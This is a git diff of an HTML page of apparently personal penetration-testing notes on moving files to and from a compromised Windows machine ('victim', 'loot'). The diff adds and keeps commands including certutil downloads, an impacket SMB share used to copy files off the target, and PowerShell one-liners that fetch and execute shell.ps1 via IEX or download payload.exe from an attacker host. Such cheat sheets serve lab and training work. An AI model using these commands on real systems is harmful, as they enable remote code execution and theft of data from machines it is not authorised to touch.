@@ -64,11 +64,11 @@
 
             <div class="nav__btns">
                 <!--Theme change button-->
-                <i class="uil uil-moon change-theme" id="theme-button"></i>
+                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>
 
                 <div class="nav__toggle" id="nav-toggle">
                     <i class="uil uil-apps"></i>
-                </div>
+                </div> -->
             </div>
         </nav>
     </header>
@@ -79,7 +79,7 @@
     <main class="main"><article id="acd1564e-9960-40a1-97e4-19e34d5d2dbf" class="page sans"><header><h1 class="page-title">Windows</h1></header><div class="page-body"><h2 id="808bee89-8b08-4023-8414-7047a26b1d67" class="">TO BOX:</h2><p id="36ded30d-0a44-491a-9cc6-a1851fbb6933" class="">Certutil</p><pre id="5038e51d-69ed-4c33-85fa-35459fe0a67b" class="code"><code>certutil -urlcache -f http://ip:port/file filename</code></pre><p id="2817870c-d896-4416-846a-22c6841e62e0" class="">SMB file transfer:</p><pre id="081d4918-7288-49cf-9667-47e062a2bf5f" class="code"><code>kali&gt; mcd smb
 copydir
 cd smb
-impacket-smbserver rxxpr .
+impacket-smbserver rxxpr . -smb2support
 victim&gt; net use *check connections*
 net use * \\&lt;ip&gt;\rxxpr
 cd Windows\tasks
@@ -89,9 +89,13 @@ copy C:\stuff Z:\loot
 
 ...
 net use /d Z:\
-del * (removes all files in windows task dir)</code></pre><p id="410abb60-6e60-4ecd-930b-faa88f48aaa7" class="">Python ftp server for Windows → kali</p><pre id="e793b2e4-fd56-45a7-a84f-c5e668a01da0" class="code"><code>#in kali
+#remove all files in windows task dir
+del * 
+---
+impacket-smbserver share $(pwd) -smb2support</code></pre><p id="410abb60-6e60-4ecd-930b-faa88f48aaa7" class="">Python ftp server for Windows → kali</p><pre id="e793b2e4-fd56-45a7-a84f-c5e668a01da0" class="code"><code>#in kali
 pip3 install pyftpdlib
 python -m pyftpdlib -p 21 --write
+python -m pyftpdlib -p 2121 -w
 #go to Desktop\tools\source folder
 #in windows
 ftp &lt;ip&gt;
@@ -112,8 +116,10 @@ net localgroup administrators </code></pre><p id="b8ce0b91-149d-45bd-bc5f-2fd9e7
 wget &quot;http://www.contoso.com&quot; -outfile &quot;file&quot;
 
 powershell -c &quot;IEX(New-Object Net.WebClient).downloadString(&#x27;http://&lt;ip&gt;:&lt;port&gt;/shell.ps1&#x27;)&quot;
-iwr -Uri 0.0.0.0/file -OutFile file.ps1</code></pre><p id="fa0e3e79-2fbe-4f03-890e-120b31514e18" class="">
-</p><p id="07dd7db7-8a66-40c8-880d-8401382c38cd" class="">Web browser available? → Navigate to the file and download it.</p><h2 id="4f97e29a-63cf-4f6c-8dfb-f0549f23bf65" class="">FROM BOX:</h2><p id="9ebb6851-11b3-4e05-a839-c1234a5e8bd4" class="">
+iwr -Uri 0.0.0.0/file -OutFile file.ps1
+
+powershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#x27;http://0.0.0.0:8000/payload.exe&#x27;, &#x27;payload.exe&#x27;)&quot;</code></pre><p id="fa0e3e79-2fbe-4f03-890e-120b31514e18" class="">
+</p><p id="07dd7db7-8a66-40c8-880d-8401382c38cd" class="">Web browser available? → Navigate to the file and download it.</p><p id="c682cbc6-5289-49ee-b335-2b578fbfe037" class="">
 </p></div></article></main></main>
 
     <!--==================== FOOTER ====================-->
